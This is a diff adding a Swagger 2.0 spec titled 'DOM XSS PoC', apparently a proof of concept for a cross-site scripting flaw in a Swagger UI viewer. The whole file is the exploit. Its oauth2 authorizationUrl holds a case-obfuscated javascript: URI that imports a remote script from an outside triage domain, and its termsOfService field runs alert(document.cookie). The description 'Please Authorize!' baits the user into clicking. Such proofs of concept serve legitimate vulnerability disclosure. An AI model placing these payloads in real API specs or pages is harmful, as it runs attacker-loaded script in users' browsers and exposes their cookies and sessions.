@@ -1,0 +1,16 @@
+swagger: '2.0'
+securityDefinitions:
+  a:
+    type: oauth2
+    authorizationUrl: JAVascript:import('https://triagedomain/tableaupoc.js')//
+info:
+  version: "0.0.1"
+  title: DOM XSS PoC
+  description: Please Authorize!
+  termsOfService: "javascript:alert(document.cookie)"
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Successful response
